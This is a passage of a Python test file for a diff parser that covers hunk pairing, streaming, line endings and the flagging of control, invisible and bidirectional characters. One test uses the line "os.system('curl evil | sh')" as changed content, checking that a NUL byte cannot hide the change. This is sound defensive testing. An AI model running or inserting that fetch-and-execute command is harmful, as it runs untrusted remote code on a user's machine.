def test_an_add_followed_by_a_remove_is_two_groups() -> None:
    (hunk,) = Diff.from_unified("@@ -1 +1 @@\n+new first\n-old after\n").files[0].hunks
    assert hunk.side_by_side == (SidePair(None, 0), SidePair(1, None))
    (hunk,) = Diff.from_unified("@@ -1,2 +1,2 @@\n-a = 1\n+a = 2\n-b = 1\n+b = 2\n").files[0].hunks
    assert hunk.side_by_side == (SidePair(0, 1), SidePair(2, 3))
    assert hunk.spans == (((4, 5),),) * 4


def test_the_no_newline_marker_sits_on_the_side_of_its_line() -> None:
    (hunk,) = Diff.from_texts("a\nb", "a\nc", "f").files[0].hunks
    assert kinds(hunk) == " -\\+\\"
    assert hunk.side_by_side == (SidePair(0, 0), SidePair(1, 3), SidePair(2, 4))
    (hunk,) = Diff.from_texts("a\nb", "a\nb\n", "f").files[0].hunks
    assert kinds(hunk) == " -\\+"
    assert hunk.side_by_side == (SidePair(0, 0), SidePair(1, 3), SidePair(2, None))
    (hunk,) = Diff.from_texts("a\nb\nc", "a\nB\nc", "f").files[0].hunks
    assert kinds(hunk) == " -+ \\"
    assert hunk.side_by_side[-2:] == (SidePair(3, 3), SidePair(4, 4))


@pytest.mark.parametrize("index", range(0, len(text_pairs()), 3))
def test_side_by_side_shows_every_row_once_per_side_in_order(index: int) -> None:
    before, after = text_pairs()[index]
    for hunk in Diff.from_texts(before, after, "f").files[0].hunks:
        left = [p.left for p in hunk.side_by_side if p.left is not None]
        right = [p.right for p in hunk.side_by_side if p.right is not None]
        assert left == sorted(left) and right == sorted(right)
        rows = hunk.rows
        old_side = [
            i
            for i, r in enumerate(rows)
            if r.kind in (C, R) or (r.kind is M and rows[i - 1].kind is not A)
        ]
        new_side = [
            i
            for i, r in enumerate(rows)
            if r.kind in (C, A) or (r.kind is M and rows[i - 1].kind is not R)
        ]
        assert left == old_side and right == new_side
        for i, spans in enumerate(hunk.spans):
            assert all(0 <= s < e <= len(rows[i].text) for s, e in spans)
            assert not spans or rows[i].kind in (A, R)


def test_a_group_too_large_to_align_is_paired_by_position() -> None:
    before = "".join(f"value_{i} = {i}\n" for i in range(40))
    after = "".join(f"value_{i} = {i + 1}\n" for i in range(40))
    (hunk,) = Diff.from_texts(before, after, "f").files[0].hunks
    assert kinds(hunk) == "-" * 40 + "+" * 40  # 1600 cells, over ALIGN_CELLS
    assert hunk.side_by_side == tuple(SidePair(i, 40 + i) for i in range(40))
    assert all(len(s) == 1 for s in hunk.spans)


def test_long_lines_and_spent_budgets_go_without_spans_and_still_pair() -> None:
    import imscribe.diff as module

    long_old, long_new = "x" * 600 + " a", "x" * 600 + " b"
    (hunk,) = Diff.from_texts(long_old + "\n", long_new + "\n", "f").files[0].hunks
    assert hunk.spans == ((), ()) and hunk.side_by_side == (SidePair(0, 1),)

    before = "".join(f"value_{i} = {i}\n" for i in range(40))
    after = "".join(f"value_{i} = {i + 1}\n" for i in range(40))
    budget = module.INTRALINE_BUDGET
    module.INTRALINE_BUDGET = 100
    try:
        (hunk,) = Diff.from_texts(before, after, "f").files[0].hunks
        with_spans = sum(1 for s in hunk.spans if s)
        pairs = hunk.side_by_side
    finally:
        module.INTRALINE_BUDGET = budget
    assert 0 < with_spans < 80
    assert pairs == tuple(SidePair(i, 40 + i) for i in range(40))


# ---------------------------------------------------------------------------
# review 1 (.concerns/lead--demo-review1-findings.md), item by item
# ---------------------------------------------------------------------------
#
# The standard those findings set: a diff must never show less than the
# change, attribute a change to the wrong file, or put text on the clipboard
# that exists on neither side without saying so.


def test_item_1_a_nul_byte_does_not_hide_the_change() -> None:
    before, after = "x = 1\n", "import os\nos.system('curl evil | sh')\n\0"
    (file,) = Diff.from_texts(before, after, "run.py").files
    assert file.status is FileStatus.MODIFIED
    assert (file.added, file.removed) == (3, 1)
    assert [r.text for h in file.hunks for r in h.rows if r.kind is A] == [
        "import os",
        "os.system('curl evil | sh')",
        "\0",
    ]
    assert file.control_characters
    assert file.expandable
    assert file.apply(before) == after  # the real characters, both ways
    assert not Diff.from_texts("a\tb\n", "a\tc\n", "f").files[0].control_characters


@pytest.mark.parametrize("character", ["\0", "\x01", "\x07", "\x0c", "\x1b", "\x7f", "\r"])
def test_item_1_any_c0_control_but_tab_is_flagged_and_kept(character: str) -> None:
    after = f"a{character}b\n"
    (file,) = Diff.from_texts("a b\n", after, "f").files
    assert file.control_characters and file.apply("a b\n") == after
    parsed = Diff.from_unified(Diff((file,)).to_unified()).files[0]
    assert parsed.control_characters and parsed.apply("a b\n") == after


def test_item_1_binary_is_what_the_host_or_git_says() -> None:
    (file,) = Diff.from_texts("a\0", "b", "blob.bin", binary=True).files
    assert file.status is FileStatus.BINARY and file.hunks == ()
    assert (file.added, file.removed) == (0, 0) and not file.expandable
    with pytest.raises(DiffApplyError):
        file.apply("a\0")
    (git,) = Diff.from_unified("Binary files a/x.png and b/x.png differ\n").files
    assert git.status is FileStatus.BINARY
    stream = UnifiedDiffStream()
    for piece in ("@@ -1 +1,2 @@\n-a\n+b\0", "c\n+d"):
        stream.feed(piece)
        assert stream.diff.files[0].control_characters


def test_item_2a_a_header_triple_is_a_file_header_whatever_the_budget_says() -> None:
    """
    pptmstr's MultiEdit string when the edits have no closing newline (the
    normal shape of an Edit): difflib writes `-foo+bar` as one line, the hunk
    is still owed a line, and the next fragment's `---`, `+++` and `@@` were
    read as that line and two more rows.
    """
    text = "\n".join([pptmstr_unified("foo", "bar", "edit 1"), pptmstr_unified("x", "y", "edit 2")])
    assert "-foo+bar\n--- a/edit 2\n+++ b/edit 2\n@@ -1 +1 @@\n-x+y" in text
    diff = Diff.from_unified(text)
    assert [f.label for f in diff.files] == ["edit 1", "edit 2"]
    # 2(c), the documented limit: `-foo+bar` is one physical line, and one
    # REMOVE row is what the text says. Nothing is invented and nothing is
    # attributed to the wrong file; the row cannot be split from text alone.
    assert [(f, r.kind, r.text) for f, _, r in diff.rows()] == [(0, R, "foo+bar"), (1, R, "x+y")]
    assert (diff.added, diff.removed) == (0, 2)
    assert [f.hunks[0].complete for f in diff.files] == [False, False]


def test_item_2a_inside_a_budget_only_the_whole_triple_is_a_header() -> None:
    text = "@@ -1,5 +1,3 @@\n-a\n--- x\n+++ y\n keep\n--- z\n+++ w\n@@ -1 +1 @@\n-q\n"
    diff = Diff.from_unified(text)
    assert [(f, r.kind, r.text) for f, _, r in diff.rows()] == [
        (0, R, "a"),
        (0, R, "-- x"),  # `--- x`, `+++ y`, then a context line: two rows
        (0, A, "++ y"),
        (0, C, "keep"),
        (1, R, "q"),  # `--- z`, `+++ w`, `@@`: the next file, though a line was still owed
    ]
    assert [f.label for f in diff.files] == ["", "w"]


def test_item_2b_from_edits_never_goes_through_text() -> None:
    edits = [("foo", "bar", "edit 1"), ("x", "y", "edit 2"), ("a\fb\rc\n", "a\fb\rd\n", "edit 3")]
    diff = Diff.from_edits(edits)
    assert [f.label for f in diff.files] == ["edit 1", "edit 2", "edit 3"]
    assert (diff.added, diff.removed) == (3, 3)
    assert [(f, r.kind, r.text) for f, _, r in diff.rows() if r.kind is not M] == [
        (0, R, "foo"),
        (0, A, "bar"),
        (1, R, "x"),
        (1, A, "y"),
        (2, R, "a\fb\rc"),  # a form feed and a lone CR are characters of one line
        (2, A, "a\fb\rd"),
    ]
    for file, (before, after, _) in zip(diff.files, edits, strict=True):
        assert file.apply(before) == after and file.expandable
    assert Diff.from_edits([]).files == ()
    assert Diff.from_edits([(None, "x\n", "new")], context=0).files[0].status is FileStatus.NEW
    # The same edits through pptmstr's text lose the form-feed line to `splitlines`.
    assert "from_edits" in (Diff.from_unified.__doc__ or "")


def test_item_3_an_over_declared_hunk_does_not_swallow_the_next_files_header() -> None:
    text = "--- a/x\n+++ b/x\n@@ -1,3 +1,3 @@\n-a\n+b\n--- a/y\n+++ b/y\n@@ -1 +1 @@\n-q\n+r\n"
    diff = Diff.from_unified(text)
    assert [f.label for f in diff.files] == ["x", "y"]
    assert [(f, r.kind, r.text) for f, _, r in diff.rows()] == [
        (0, R, "a"),
        (0, A, "b"),
        (1, R, "q"),
        (1, A, "r"),
    ]
    assert not diff.files[0].hunks[0].complete and diff.files[1].hunks[0].complete
    # The same with a git header between them, which was already read.
    git = text.replace("--- a/y", "diff --git a/y b/y\n--- a/y")
    assert [f.label for f in Diff.from_unified(git).files] == ["x", "y"]


def test_item_2_removing_a_line_that_is_exactly_dash_dash_opens_no_file() -> None:
    for text in ("@@\n-a\n---\n+b\n", "@@ -1 +1 @@\n-a\n---\n+b\n", "@@ -1,2 +1 @@\n-a\n---\n+b\n"):
        diff = Diff.from_unified(text)
        assert len(diff.files) == 1
        assert [(r.kind, r.text) for _, _, r in diff.rows()] == [(R, "a"), (R, "--"), (A, "b")]
    # ... also as the very last line of a complete text,
    assert [r.text for _, _, r in Diff.from_unified("@@\n-a\n---\n").rows()] == ["a", "--"]
    # ... and a stream that has not seen what follows shows no row it may take back.
    stream = UnifiedDiffStream()
    stream.feed("@@ -1,3 +1 @@\n-a\n--- x\n")
    assert stream.diff.unsettled == 1 and flat(stream.diff, False)[-1][2].text == "-- x"
    stream.feed("+++ y\n")
    assert stream.diff.unsettled == 2 and not stream.diff.provisional
    stream.feed("@")
    assert stream.diff.unsettled == 2
    stream.feed("@ -1 +1 @@\n")
    assert stream.diff.unsettled == 0 and [f.label for f in stream.diff.files] == ["", "y"]
    assert [r.text for _, _, r in stream.diff.rows()] == ["a"]


def test_a_closed_stream_has_settled_everything() -> None:
    stream = UnifiedDiffStream()
    stream.feed("@@ -1,2 +1 @@\n-a\n--- x\n+b")
    assert stream.diff.provisional
    stream.close()
    assert stream.diff == Diff.from_unified("@@ -1,2 +1 @@\n-a\n--- x\n+b")
    assert not stream.diff.provisional and stream.diff.unsettled == 0
    assert [r.text for _, _, r in stream.diff.rows()] == ["a", "-- x", "b"]
    stream.feed("\n+c\n")  # text after a close: read again from the start, as one text
    assert [r.text for _, _, r in stream.diff.rows()] == ["a", "-- x", "b", "c"]


def test_item_4_rows_that_differ_only_in_line_ending_are_marked_and_the_file_says_so() -> None:
    (file,) = Diff.from_texts("a\r\nb\r\n", "a\nb\n", "f.txt").files
    (hunk,) = file.hunks
    assert file.line_endings == "CRLF -> LF"
    assert [(r.kind, r.text, r.eol) for r in hunk.rows] == [
        (R, "a", "\r\n"),
        (R, "b", "\r\n"),
        (A, "a", "\n"),
        (A, "b", "\n"),
    ]
    assert hunk.eol_rows == frozenset({0, 1, 2, 3})
    assert (file.added, file.removed) == (2, 2) and file.apply("a\r\nb\r\n") == "a\nb\n"
    # The other way, mixed endings, and a real change beside an ending change.
    assert Diff.from_texts("a\nb\n", "a\r\nb\r\n", "f").files[0].line_endings == "LF -> CRLF"
    assert Diff.from_texts("a\r\nb\n", "a\nb\n", "f").files[0].line_endings == "mixed -> LF"
    (mixed,) = Diff.from_texts("a\r\nb\r\nc\n", "a\nB\r\nc\n", "f").files
    assert mixed.line_endings == ""
    assert mixed.hunks[0].eol_rows == frozenset({0, 2})  # `a` and `a`; `b` -> `B` is a change
    # Nothing to say where nothing of the kind happened.
    plain = Diff.from_texts("a\nb\n", "a\nc\n", "f").files[0]
    assert plain.line_endings == "" and plain.hunks[0].eol_rows == frozenset()
    # A final newline gained is an ending-only pair too; the META row says which.
    (final,) = Diff.from_texts("a", "a\n", "f").files
    assert final.hunks[0].eol_rows == frozenset({0, 2}) and final.line_endings == ""
    # Read from text, the rows still know; the file-level statement needs the texts.
    parsed = Diff.from_unified(Diff((file,)).to_unified()).files[0]
    assert parsed.hunks[0].eol_rows == frozenset({0, 1, 2, 3}) and parsed.line_endings == ""


def _from_scratch(hunk: Hunk) -> tuple[object, object, object]:
    fresh = Hunk(hunk.old_start, hunk.new_start, hunk.rows)
    return fresh.side_by_side, fresh.spans, fresh.eol_rows


@pytest.mark.parametrize(
    ("settled", "typed", "most"),
    [
        # A new file: adds only. Nothing behind the line being typed is paired again.
        ("@@ -0,0 +1,900 @@\n" + "".join(f"+line {i}\n" for i in range(300)), "+abcd\n+e\n", 3),
        # Edits between context lines: only the open group, which is small.
        (
            "@@ -1,900 +1,900 @@\n"
            + "".join(f" c {i}\n-old {i}\r\n+new {i}\n" for i in range(300)),
            "+abcd\n-gone\n+come\n kept\n-x\n\\ No newline at end of file\n+x\n",
            8,
        ),
        # No declared lengths, and a `---` line held for the line after it.
        ("@@\n" + "".join(f" c {i}\n+n {i}\n" for i in range(300)), "--- x\n+++ y\n z\n", 6),
    ],
    ids=["adds-only", "edits-between-context", "no-lengths-and-held-lines"],
)
def test_item_7_pairing_an_open_hunk_costs_the_open_group_and_not_the_hunk(
    settled: str, typed: str, most: int
) -> None:
    """
    Count-based, a character at a time. `Hunk.side_by_side` / `Hunk.spans`
    were derived per hunk object, and a stream's open hunk is a new object in
    every snapshot: each character cost a pass over the whole hunk (901 rows
    here). Now the rows walked per snapshot are the rows since the last point
    behind which nothing can change.
    """
    from imscribe import diff as module

    stream = UnifiedDiffStream()
    stream.feed(settled)
    assert stream.diff.files[0].hunks[0].side_by_side  # the first look pays for what is there
    costs = []
    for character in typed:
        stream.feed(character)
        hunk = [h for f in stream.diff.files for h in f.hunks][-1]
        before = module._DERIVED_ROWS[0]
        got = (hunk.side_by_side, hunk.spans, hunk.eol_rows)
        costs.append(module._DERIVED_ROWS[0] - before)
        assert got == _from_scratch(hunk)
    assert len(stream.diff.files[0].hunks[0].rows) >= 300
    assert max(costs) <= most, costs
    # An older snapshot asked late, after the stream moved on, is still right.
    old = [h for f in stream.diff.files for h in f.hunks][-1]
    stream.feed("+later\n-and\n+more\n")
    assert stream.diff.files[-1].hunks[-1].side_by_side
    assert (old.side_by_side, old.spans, old.eol_rows) == _from_scratch(old)
    stream.close()
    closed = stream.diff.files[0].hunks[0]
    assert (closed.side_by_side, closed.spans, closed.eol_rows) == _from_scratch(closed)


def test_review3_item_8_a_run_of_removals_still_open_costs_the_line_that_arrived() -> None:
    """
    Was pinned as "the one linear case" (301 rows walked for the 301st
    removed line: a file deleted line by line was quadratic, 1,125,750 rows
    walked for 1,500 lines). A removal with no add after it yet is laid
    beside nothing, and that does not change when another removal follows:
    the walk now resumes inside the run.
    """
    from imscribe import diff as module

    count = 1500
    stream = UnifiedDiffStream()
    stream.feed(f"--- a/f.py\n+++ /dev/null\n@@ -1,{count} +0,0 @@\n")
    costs = []
    for number in range(count):
        stream.feed(f"-line {number} of the deleted file\n")
        before = module._DERIVED_ROWS[0]
        hunk = stream.diff.files[-1].hunks[-1]
        got = (hunk.side_by_side, hunk.spans, hunk.eol_rows)
        costs.append(module._DERIVED_ROWS[0] - before)
        if number % 97 == 0:
            assert got == _from_scratch(hunk)
    assert max(costs) <= 2, max(costs)
    assert sum(costs) <= 2 * count  # (was 1,125,750)
    # A character at a time, and with what a run of removals can be followed by.
    for tail in ("-last\n+an add, which may pair with any of them\n kept\n", " context\n-x\n"):
        other = UnifiedDiffStream()
        other.feed("@@ -1,400 +1,3 @@\n" + "".join(f"-gone {i}\n" for i in range(300)))
        assert len(other.diff.files[0].hunks[0].side_by_side) == 300
        for character in tail:
            other.feed(character)
            hunk = other.diff.files[0].hunks[0]
            assert (hunk.side_by_side, hunk.spans, hunk.eol_rows) == _from_scratch(hunk)
        other.close()
        hunk = other.diff.files[0].hunks[0]
        assert (hunk.side_by_side, hunk.spans, hunk.eol_rows) == _from_scratch(hunk)
    # The no-newline marker of a removed line, and removals that are equal lines.
    marked = UnifiedDiffStream()
    for piece in (
        "@@ -1,4 +1,2 @@\n-a\n",
        "-a\n",
        "\\ No newline at end of file\n",
        "+a\n",
        "+b\n",
    ):
        marked.feed(piece)
        hunk = marked.diff.files[0].hunks[0]
        assert (hunk.side_by_side, hunk.spans, hunk.eol_rows) == _from_scratch(hunk)


def test_item_8_a_format_patch_mail_is_one_file_with_its_rows() -> None:
    """The `---` over the diffstat was a file of its own, the `-- ` signature a removed row."""
    diff = Diff.from_unified(MAIL)
    assert [f.label for f in diff.files] == ["f.py"]
    assert [(r.kind, r.text) for _, _, r in diff.rows()] == [(R, "a"), (A, "b")]
    assert (diff.added, diff.removed) == (1, 1)
    # Two mails in one text, as `git format-patch --stdout` writes a series.
    series = Diff.from_unified(MAIL + "\n" + MAIL.replace("f.py", "g.py"))
    assert [f.label for f in series.files] == ["f.py", "g.py"]
    assert (series.added, series.removed) == (2, 2)
    # `-- ` is a signature only before a version number, and only once the
    # hunk has had the lines it declared: otherwise it is the removal of "- ".
    text = "@@ -1,2 +1 @@\n-a\n-- \n+b\n"
    assert [(r.kind, r.text) for _, _, r in Diff.from_unified(text).rows()] == [
        (R, "a"),
        (R, "- "),
        (A, "b"),
    ]
    past = Diff.from_unified("@@ -1 +1 @@\n-a\n+b\n-- \n-c\n")
    assert [r.text for _, _, r in past.rows()] == ["a", "b", "- ", "c"]
    assert [r.text for _, _, r in Diff.from_unified("@@ -1 +1 @@\n-a\n+b\n-- \n").rows()] == [
        "a",
        "b",
        "- ",
    ]


COMBINED_TEXT = (
    "diff --cc f.py\nindex 1,2..3\n--- a/f.py\n+++ b/f.py\n@@@ -1,2 -1,2 +1,3 @@@\n"
    "  keep\n- ours\n -theirs\n++merged\n +from-theirs\n"
)


def test_item_9_a_combined_diff_is_flagged_and_kept_as_its_lines() -> None:
    (file,) = Diff.from_unified(COMBINED_TEXT).files
    assert file.dialect == COMBINED and file.label == "f.py"
    assert file.hunks == () and (file.added, file.removed) == (0, 0)
    assert file.raw == tuple(COMBINED_TEXT.splitlines())
    assert file.to_unified() == COMBINED_TEXT
    # A fragment that starts at the `@@@` line, and an ordinary file after one.
    (bare,) = Diff.from_unified("@@@ -1 -1 +1 @@@\n- a\n++b\n").files
    assert bare.dialect == COMBINED and bare.raw == ("@@@ -1 -1 +1 @@@", "- a", "++b")
    both = Diff.from_unified(
        COMBINED_TEXT + "diff --git a/g b/g\n--- a/g\n+++ b/g\n@@ -1 +1 @@\n-x\n+y\n"
    )
    assert [(f.label, f.dialect, f.added) for f in both.files] == [
        ("f.py", COMBINED, 0),
        ("g", "", 1),
    ]
    # Streamed, no line of it is ever a row.
    stream = UnifiedDiffStream()
    for character in COMBINED_TEXT:
        stream.feed(character)
        assert not list(stream.diff.rows())


def test_item_10_unmarked_lines_above_a_fragment_are_its_context() -> None:
    (file,) = Diff.from_unified("def f():\n-    return 1\n+    return 2\n").files
    assert [(r.kind, r.text) for r in file.hunks[0].rows] == [
        (C, "def f():"),
        (R, "    return 1"),
        (A, "    return 2"),
    ]
    assert file.dialect == "" and (file.added, file.removed) == (1, 1)
    # Leading blank lines are not context; a blank line between is.
    (file,) = Diff.from_unified("\n\nclass A:\n\n    x = 1\n+    y = 2\n").files
    assert [r.text for r in file.hunks[0].rows] == ["class A:", "", "   x = 1", "    y = 2"]
    # A mail's message is not context, bullets and all.
    assert not any(
        r.text == "a bullet in the message" for _, _, r in Diff.from_unified(MAIL).rows()
    )


def test_item_10_text_that_is_not_a_diff_is_shown_as_it_is_and_never_as_nothing() -> None:
    (file,) = Diff.from_unified("hello\nworld\n").files
    assert file.dialect == NOT_A_DIFF and file.raw == ("hello", "world") and file.hunks == ()
    assert Diff.from_unified("just one line").files[0].raw == ("just one line",)
    # A stream: what has arrived is shown until something in it is a diff.
    stream = UnifiedDiffStream()
    stream.feed("Here is the patch\n")
    assert stream.diff.files[0].dialect == NOT_A_DIFF
    stream.feed("--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n")
    assert [(f.label, f.dialect) for f in stream.diff.files] == [("x", "")]
    # ... and a diff's first, unfinished line is not flashed up as "not a diff".
    stream = UnifiedDiffStream()
    stream.feed("diff --g")
    assert stream.diff.files == ()


def test_a_git_path_with_a_space_and_b_slash_in_it_is_read_whole() -> None:
    text = "diff --git a/a b/c b/a b/c\nold mode 100644\nnew mode 100755\n"
    (file,) = Diff.from_unified(text).files
    assert file.label == "a b/c"
    renamed = Diff.from_unified(
        "diff --git a/old.py b/new.py\nsimilarity index 100%\n"
        "rename from old.py\nrename to new.py\n"
    ).files[0]
    assert renamed.label == "new.py" and "rename from old.py" in renamed.header


_AWKWARD = [
    "plain",
    "tab\there",
    "form\ffeed",
    "lone\rreturn",
    "line\u2028separator",
    "next\x85line",
    "nul\0byte",
    "caf\u00e9 \u4e2d\u6587 \U0001f600",
    "x" * 700,
    "---",
    "-- ",
    "+++ b",
    "@@ -1 +1 @@",
    "",
]


def awkward_pairs(count: int = 60) -> list[tuple[str, str]]:
    """
    What the first corpus lacks (review 1, "tests the reviewer reads as
    weak"): carriage returns alone and in CRLF, form feeds, U+2028, NEL, NUL,
    text outside ASCII, lines past the intra-line limit, lines that look like
    headers and signatures.
    """
    rng = random.Random(1007)
    pairs = []
    for _ in range(count):
        ends = rng.choice(["\n", "\r\n"])
        lines = [rng.choice(_AWKWARD) for _ in range(rng.randrange(1, 25))]
        before = ends.join(lines) + (ends if rng.random() < 0.7 else "")
        after = mutate(rng, before)
        if rng.random() < 0.3:
            after = after.replace("\r\n", "\n")
        pairs.append((before, after))
    return pairs


@pytest.mark.parametrize("index", range(len(awkward_pairs())))
def test_awkward_characters_apply_round_trip_and_stream_to_the_same_diff(index: int) -> None:
    before, after = awkward_pairs()[index]
    rng = random.Random(index)
    for context in (3, 0):
        (file,) = Diff.from_texts(before, after, "f.txt", context=context).files
        assert file.status is not FileStatus.BINARY
        assert file.apply(before) == after
        text = file.to_unified()
        parsed = Diff.from_unified(text)
        if before == after:
            continue
        assert [h.rows for h in parsed.files[0].hunks] == [h.rows for h in file.hunks]
        assert len(parsed.files) == 1 and parsed.files[0].apply(before) == after
        # Correctness of the stream, not only its consistency: fed in random
        # pieces and closed, it is a diff that turns `before` into `after`.
        stream = UnifiedDiffStream()
        at = 0
        while at < len(text):
            step = rng.randrange(1, 40)
            stream.feed(text[at : at + step])
            at += step
            assert flat(stream.diff) == flat(parsed)[: len(flat(stream.diff))]
        stream.close()
        assert stream.diff == parsed and stream.diff.files[0].apply(before) == after


def test_the_awkward_corpus_is_not_vacuous() -> None:
    pairs = awkward_pairs()
    joined = "".join(before + after for before, after in pairs)
    for character in ("\f", "\u2028", "\0", "\x85", "\u00e9", "\r\n"):
        assert character in joined
    assert sum(1 for before, after in pairs if before != after) >= 50
    diffs = [Diff.from_texts(before, after, "f") for before, after in pairs]
    assert sum(d.files[0].control_characters for d in diffs) >= 20
    assert sum(len(d.files[0].hunks) > 1 for d in diffs) >= 5


# ---------------------------------------------------------------------------
# review 3 (.concerns/lead--demo-review3-findings.md), item by item
# ---------------------------------------------------------------------------


def test_review3_item_1_the_invisible_set_is_this_pythons_format_and_separator_characters() -> None:
    """
    `has_invisible` is a hard-coded character class (a scan of the Unicode
    database at import costs more than the module). This holds it to the
    database of the Python running: every Cf, Zl and Zp character is in it,
    and anything else in it is a character this Python's database does not
    know yet (the class was written from a later Unicode: U+13439 to U+1343F).
    """
    import sys
    import unicodedata

    from imscribe.diff import has_invisible

    category = {chr(c): unicodedata.category(chr(c)) for c in range(sys.maxunicode + 1)}
    wanted = {c for c, kind in category.items() if kind in ("Cf", "Zl", "Zp")}
    found = {c for c in category if has_invisible(c)}
    assert sorted(hex(ord(c)) for c in wanted - found) == []
    assert {category[c] for c in found - wanted} <= {"Cn"}
    assert len(found) > 150


@pytest.mark.parametrize(
    "character",
    ["\u200b", "\u202e", "\u2066", "\u200d", "\ufeff", "\u00ad", "\u2028", "\U000e0041"],
)
def test_review3_item_1_an_invisible_or_bidirectional_character_is_flagged_and_kept(
    character: str,
) -> None:
    from imscribe.diff import has_control, has_invisible

    after = f"user = ad{character}min\n"
    assert has_invisible(after) and not has_control(after)
    (file,) = Diff.from_texts("user = admin\n", after, "f").files
    assert file.invisible_characters and file.control_characters
    assert file.hunks[0].invisible_characters
    assert file.apply("user = admin\n") == after
    parsed = Diff.from_unified(Diff((file,)).to_unified()).files[0]
    assert parsed.invisible_characters and parsed.control_characters
    stream = UnifiedDiffStream()
    for piece in ("@@ -1 +1,2 @@\n-a\n+b", character + "c\n+d"):
        stream.feed(piece)
    assert stream.diff.files[0].invisible_characters
    # Text with neither says neither; a NUL is a control and not an invisible.
    plain = Diff.from_texts("a\n", "caf\u00e9 \u4e2d\n", "f").files[0]
    assert not plain.invisible_characters and not plain.control_characters
    nul = Diff.from_texts("a\n", "a\0\n", "f").files[0]
    assert nul.control_characters and not nul.invisible_characters


def test_review3_item_1_c1_controls_are_controls_and_raw_lines_are_looked_at_too() -> None:
    from imscribe.diff import has_control

    assert has_control("next\x85line") and has_control("\x9b[31m") and not has_control("\xa0")
    (raw,) = Diff.from_unified("just prose with a \u202e in it\n").files
    assert raw.dialect == NOT_A_DIFF and raw.invisible_characters and raw.control_characters


def test_review3_item_2_an_honest_u0_hunk_ending_in_dash_dash_plus_plus_keeps_its_file() -> None:
    """
    `-- removed entry` removed and `++ added entry` added, at the end of a
    context-free hunk, with the same file's next `@@` straight after: the
    lines `--- removed entry`, `+++ added entry`, `@@ ...`. The triple rule
    (review 1, item 2a) read that as a file header whatever the counts said,
    closed the hunk empty and filed the rest under a file named
    `added entry`. Counts decide now: the two lines are exactly what the hunk
    was still owed, so they are its rows.
    """
    before = "title\n-- removed entry\nkeep 1\nkeep 2\nkeep 3\nold tail\n"
    after = "title\n++ added entry\nkeep 1\nkeep 2\nkeep 3\nnew tail\n"
    text = "".join(
        difflib.unified_diff(
            before.splitlines(True), after.splitlines(True), "a/notes.txt", "b/notes.txt", n=0
        )
    )
    assert "\n--- removed entry\n+++ added entry\n@@ " in text
    diff = Diff.from_unified(text)
    assert [(f.label, f.added, f.removed) for f in diff.files] == [("notes.txt", 2, 2)]
    assert diff.files[0].apply(before) == after
    assert [h.complete for h in diff.files[0].hunks] == [True, True]
    # The lying case the triple rule exists for is still read as it was: the
    # old side of the hunk is already spent when `--- a/edit 2` arrives.
    lying = "\n".join(
        [pptmstr_unified("foo", "bar", "edit 1"), pptmstr_unified("x", "y", "edit 2")]
    )
    assert [f.label for f in Diff.from_unified(lying).files] == ["edit 1", "edit 2"]
    # A stream shows the two lines as rows while the `@@` is still arriving.
    stream = UnifiedDiffStream()
    stream.feed(text[: text.index("+++ added entry\n") + len("+++ added entry\n")] + "@")
    assert [f.label for f in stream.diff.files] == ["notes.txt"]
    assert [r.text for _, _, r in stream.diff.rows()] == ["-- removed entry", "++ added entry"]


HOSTILE = [
    "-- x",
    "++ y",
    "--- a/z",
    "+++ b/z",
    "@@ -1 +1 @@",
    "From x",
    "-- ",
    "\u2026",
    "",
    "plain",
    "\\ x",
    "diff --git a/q b/q",
    "- ",
    "2.39.0",
    "---",
    "+++",
    "Binary files a and b differ",
    "@@@ -1 -1 +1 @@@",
]
"""
Lines that look like the parts of a diff, as the CONTENT of a file: review
3's pool (the first eight) and ten more of the same kind.
"""


def hostile_text(rng: random.Random) -> str:
    return "".join(rng.choice(HOSTILE) + "\n" for _ in range(rng.randrange(0, 14)))


def hostile_pairs(count: int = 400) -> list[tuple[str, str]]:
    rng = random.Random(3007)
    pairs = []
    for _ in range(count):
        before = hostile_text(rng)
        lines = before.splitlines(True)
        for _ in range(rng.randrange(1, 5)):
            at = rng.randrange(0, len(lines) + 1)
            action = rng.random()
            if action < 0.4 and lines:
                del lines[min(at, len(lines) - 1)]
            elif action < 0.7:
                lines.insert(at, rng.choice(HOSTILE) + "\n")
            elif lines:
                lines[min(at, len(lines) - 1)] = rng.choice(HOSTILE) + "\n"
        pairs.append((before, "".join(lines)))
    return pairs


@pytest.mark.parametrize("context", [0, 1, 3])
def test_review3_item_2_difflib_text_of_hostile_lines_applies(context: int) -> None:
    """
    The property review 3 asked for. For before/after texts whose lines are
    drawn from `HOSTILE` and end in a newline, the text `difflib.unified_diff`
    writes -- an honest diff: every count in it is true -- is read back as one
    file that turns `before` into `after`, at context 0, 1 and 3.
    """
    failures = []
    changed = 0
    for index, (before, after) in enumerate(hostile_pairs()):
        if before == after:
            continue
        changed += 1
        text = "".join(
            difflib.unified_diff(
                before.splitlines(True), after.splitlines(True), "a/f.txt", "b/f.txt", n=context
            )
        )
        diff = Diff.from_unified(text)
        try:
            ok = len(diff.files) == 1 and diff.files[0].apply(before) == after
        except DiffApplyError:
            ok = False
        if not ok:
            failures.append((index, before, after))
    assert changed > 300
    assert failures[:3] == [], f"{len(failures)} of {changed} fail"


def test_review3_item_5_a_fragment_whose_first_line_begins_from_is_still_a_fragment() -> None:
    """
    A mail was recognised by the word: any first line starting `From ` made
    the lines above the first `+`/`-` a message, never context -- and a
    header-less fragment whose first context line is prose ("From here on
    ...") came out as "not a diff", +0 -0. A mail is now known by the line
    `git format-patch` writes, `From <object name> <date>`, and by nothing
    less.
    """
    for first in ("from here on the default is 2.", "From here on the default is 2."):
        (file,) = Diff.from_unified(first + "\n-default = 1\n+default = 2\n").files
        assert file.dialect == "" and (file.added, file.removed) == (1, 1), first
        assert [(r.kind, r.text) for r in file.hunks[0].rows] == [
            (C, first),
            (R, "default = 1"),
            (A, "default = 2"),
        ]
    # A real mail is still a message and then a diff, under either hash.
    for name in ("3f2a9c1d5e7b8a6f4c0d1e2f3a4b5c6d7e8f9a0b", "a1" * 32):
        (file,) = Diff.from_unified(MAIL.replace(MAIL_NAME, name)).files
        assert file.label == "f.py" and (file.added, file.removed) == (1, 1)
        assert [r.text for h in file.hunks for r in h.rows] == ["a", "b"]
    # The word alone, over a bulleted message: not a mail, so the bullet is a
    # removed line of a fragment. That is the price, and it is the decision.
    loose = Diff.from_unified(MAIL.replace(MAIL_NAME, "1234")).files[0]
    assert (R, " a bullet in the message") in [(r.kind, r.text) for r in loose.hunks[0].rows]


def test_review3_item_6_a_log_in_a_diff_fence_keeps_every_line() -> None:
    """
    `go test` output, which a model puts in a `diff` fence because of its
